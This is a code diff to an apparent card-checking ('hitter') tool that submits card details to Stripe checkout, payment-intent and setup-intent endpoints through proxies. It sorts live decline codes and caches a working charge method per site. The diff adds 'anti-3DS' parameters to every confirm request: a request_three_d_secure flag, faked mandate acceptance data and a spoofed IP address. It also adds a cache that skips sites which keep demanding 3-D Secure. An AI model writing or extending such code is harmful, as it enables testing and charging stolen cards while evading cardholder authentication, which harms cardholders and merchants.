@@ -21,6 +21,7 @@ from hitter.browser_charge import browser_charge_card, close_browser
 _session = None
 _site_method_cache: dict[str, str] = {}
 _checkout_cookies_cache: dict[str, dict] = {}
+_site_3ds_cache: dict[str, int] = {}
 
 LIVE_DECLINE_CODES = frozenset({
     "incorrect_cvc", "incorrect_zip", "insufficient_funds",
@@ -190,6 +191,15 @@ def _card_pm_data(card: dict) -> str:
     )
 
 
+def _anti_3ds_params() -> str:
+    """Anti-3DS parameters inspired by DeepBypasser's request interception."""
+    return (
+        "&payment_method_options[card][request_three_d_secure]=any"
+        "&mandate_data[customer_acceptance][type]=online"
+        "&mandate_data[customer_acceptance][online][ip_address]=8.8.8.8"
+    )
+
+
 async def _fetch_checkout_cookies(checkout_url: str, proxy_url: str | None = None) -> dict:
     cs_match = re.search(r"cs_(live|test)_[A-Za-z0-9]+", checkout_url)
     cache_key = cs_match.group(0) if cs_match else checkout_url
@@ -240,6 +250,7 @@ async def _method_direct_pages(s, card, pk, cs, init_data, headers, proxy_url, c
         f"&last_displayed_line_item_group_details[total_discount_amount]=0"
         f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
         f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
+        f"{_anti_3ds_params()}"
     )
     async with s.post(
         f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
@@ -262,6 +273,7 @@ async def _method_direct_pi(s, card, pk, init_data, headers, proxy_url, country=
         f"&expected_payment_method_type=card"
         f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
         f"&key={pk}&client_secret={client_secret}"
+        f"{_anti_3ds_params()}"
     )
     async with s.post(
         f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
@@ -309,6 +321,7 @@ async def _method_token_pi(s, card, pk, init_data, headers, proxy_url, country="
         f"&expected_payment_method_type=card"
         f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
         f"&key={pk}&client_secret={client_secret}"
+        f"{_anti_3ds_params()}"
     )
     async with s.post(
         f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
@@ -354,6 +367,7 @@ async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url, count
         f"&last_displayed_line_item_group_details[total_discount_amount]=0"
         f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
         f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
+        f"{_anti_3ds_params()}"
     )
     async with s.post(
         f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
@@ -377,6 +391,7 @@ async def _method_setup_intent(s, card, pk, init_data, headers, proxy_url, count
         f"&expected_payment_method_type=card"
         f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
         f"&key={pk}&client_secret={client_secret}"
+        f"{_anti_3ds_params()}"
     )
     async with s.post(
         f"https://api.stripe.com/v1/setup_intents/{si_id}/confirm",
@@ -399,8 +414,17 @@ async def charge_card_fast(
 
     cached = _site_method_cache.get(cs)
 
+    if _site_3ds_cache.get(cs, 0) >= 2:
+        result["status"] = "3DS"
+        result["response"] = "3DS Required (site cached)"
+        result["time"] = 0
+        return result
+
     if cached == "BROWSER" and checkout_url:
-        return await browser_charge_card(card, checkout_url, proxy_url)
+        br = await browser_charge_card(card, checkout_url, proxy_url)
+        if br.get("status") == "3DS":
+            _site_3ds_cache[cs] = _site_3ds_cache.get(cs, 0) + 1
+        return br
 
     if checkout_url:
         await _fetch_checkout_cookies(checkout_url, proxy_url)
@@ -460,6 +484,8 @@ async def charge_card_fast(
                     result.update(br)
                     if br["status"] not in (None, "ERROR"):
                         _site_method_cache[cs] = "BROWSER"
+                    if br.get("status") == "3DS":
+                        _site_3ds_cache[cs] = _site_3ds_cache.get(cs, 0) + 1
                     return result
 
                 if res is None:
@@ -467,6 +493,8 @@ async def charge_card_fast(
                     result["response"] = "All methods unsupported"
                 else:
                     result["status"], result["response"] = res
+                    if result["status"] == "3DS":
+                        _site_3ds_cache[cs] = _site_3ds_cache.get(cs, 0) + 1
 
                 result["time"] = round(time.perf_counter() - start, 2)
                 return result
